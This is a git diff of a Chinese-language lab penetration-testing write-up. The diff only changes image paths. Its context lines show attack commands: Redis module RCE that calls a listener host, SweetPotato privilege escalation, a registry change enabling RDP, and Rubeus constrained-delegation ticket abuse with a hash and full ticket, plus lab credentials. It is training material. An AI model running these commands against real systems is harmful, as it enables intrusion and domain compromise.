@@ -59,7 +59,7 @@ tags = ["writeup", "渗透", "春秋云镜"]
 
 那我们连上去
 
-![image-20250317141531955](./assets/image-20250317141531955.png)
+![image-20250317141531955](../assets/image-20250317141531955.png)
 
 
 
@@ -67,13 +67,13 @@ redis未授权拿shell的常见利用方法有写webshell，写corn或者写sshk
 
 这里我先尝试了写corn
 
-![image-20250317142526810](./assets/image-20250317142526810.png)
+![image-20250317142526810](../assets/image-20250317142526810.png)
 
 发现没权限
 
 那同样的也没办法写sshkey
 
-![image-20250317143311383](./assets/image-20250317143311383.png)
+![image-20250317143311383](../assets/image-20250317143311383.png)
 
 看到redis版本为5.0.12
 
@@ -102,11 +102,11 @@ python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so
 
 
 
-![image-20250317144701781](./assets/image-20250317144701781.png)
+![image-20250317144701781](../assets/image-20250317144701781.png)
 
 拿到shell之后先上个线
 
-![image-20250317145522117](./assets/image-20250317145522117.png)
+![image-20250317145522117](../assets/image-20250317145522117.png)
 
 ```
 /home/redis/flag/flag01
@@ -143,7 +143,7 @@ python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so
 
 base64可以提权，但是只能读文件
 
-![image-20250317145341222](./assets/image-20250317145341222.png)
+![image-20250317145341222](../assets/image-20250317145341222.png)
 
 ```
 base64 "/home/redis/flag/flag01" | base64 --decode
@@ -369,13 +369,13 @@ print(requests.post(
 
 成功RCE，用户是www-data
 
-![image-20250317203216535](./assets/image-20250317203216535.png)
+![image-20250317203216535](../assets/image-20250317203216535.png)
 
 但是靶机不出网，没办法上线
 
 那就直接用蚁剑连
 
-![image-20250317204451034](./assets/image-20250317204451034.png)
+![image-20250317204451034](../assets/image-20250317204451034.png)
 
 
 
@@ -408,7 +408,7 @@ wpuser/WpuserEha8Fgj9
 
 这个机子不对外开放端口，所以我们直接用webshell管理器上的数据库管理工具连
 
-![image-20250317205907473](./assets/image-20250317205907473.png)
+![image-20250317205907473](../assets/image-20250317205907473.png)
 
 拿到第二个flag
 
@@ -426,7 +426,7 @@ flag{c757e423-eb44-459c-9c63-7625009910d8}
 
 **注意这里用蚁剑导出之前记得将limit去掉，不然密码不全**
 
-![image-20250317210114116](./assets/image-20250317210114116.png)
+![image-20250317210114116](../assets/image-20250317210114116.png)
 
 **172.22.2.16**上有mssql服务
 
@@ -436,7 +436,7 @@ NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 
 
 用我们手上的这堆密码爆破一下
 
-![image-20250317212152193](./assets/image-20250317212152193.png)
+![image-20250317212152193](../assets/image-20250317212152193.png)
 
 成功拿到账号密码
 
@@ -446,7 +446,7 @@ sa/ElGNkOiC
 
 接下来直接用mdut连
 
-![image-20250317212417972](./assets/image-20250317212417972.png)
+![image-20250317212417972](../assets/image-20250317212417972.png)
 
 拿到**nt service\mssqlserver**权限
 
@@ -457,7 +457,7 @@ sa/ElGNkOiC
 C:/Users/Public/sweetpotato.exe -a "whoami"
 ```
 
-![image-20250317220327866](./assets/image-20250317220327866.png)
+![image-20250317220327866](../assets/image-20250317220327866.png)
 
 拿到第三个flag
 
@@ -491,13 +491,13 @@ REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnec
 
 信息收集一下
 
-![image-20250317221808816](./assets/image-20250317221808816.png)
+![image-20250317221808816](../assets/image-20250317221808816.png)
 
 发现这台机子在域内
 
 用bloodhound做一下信息收集
 
-chu0的图，偷过来了![undefined (1)](./assets/undefined (1).png)
+chu0的图，偷过来了![undefined (1)](../assets/undefined (1).png)
 
 从图中我们可以看到，MSSQLSERVER 具有对 DC 的约束性委派权限
 
@@ -511,9 +511,9 @@ chu0的图，偷过来了![undefined (1)](./assets/undefined (1).png)
 
 https://xz.aliyun.com/news/13854
 
-![image-20250317223011253](./assets/image-20250317223011253.png)
+![image-20250317223011253](../assets/image-20250317223011253.png)
 
-![image-20250317223039443](./assets/image-20250317223039443.png)
+![image-20250317223039443](../assets/image-20250317223039443.png)
 
 
 
@@ -607,7 +607,7 @@ Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:7e7c2b7d5cbee13683f637e721e4a147 /doma
 Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
 ```
 
-![image-20250317232613642](./assets/image-20250317232613642.png)
+![image-20250317232613642](../assets/image-20250317232613642.png)
 
 接下来就可以和DC进行通讯了
 
@@ -616,7 +616,7 @@ WIN+R
 \\DC.xiaorang.lab\C$\Users\Administrator\flag\
 ```
 
-![image-20250317233125339](./assets/image-20250317233125339.png)
+![image-20250317233125339](../assets/image-20250317233125339.png)
 
 或者
 
